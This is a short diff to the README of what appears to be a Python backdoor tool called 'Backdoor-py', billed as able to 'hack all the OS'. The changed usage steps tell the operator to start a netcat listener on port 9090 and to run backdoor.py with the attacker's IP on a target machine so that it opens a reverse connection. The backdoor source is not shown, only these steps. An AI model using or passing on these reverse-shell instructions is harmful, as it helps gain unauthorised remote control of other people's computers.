@@ -14,11 +14,11 @@ Hack all the OS using python
 1. Download and Extract the latest release from [HERE](https://github.com/karthi-the-hacker/Backdoor-py.git)
 
 2. In the Your machine open Command prompt / Terminal and run 
-    - `nc -lvp <port>` <- Listener 
+    - `nc -lvp 9090` <- Listener 
   
 
 3. In the Target machine open Command prompt / Terminal
-    - `python backdoor.py <ip> <port>` <- It will triger the reverse connection
+    - `python backdoor.py <ip> ` <- It will triger the reverse connection
   
  
  ### Company Profile 🏢 :
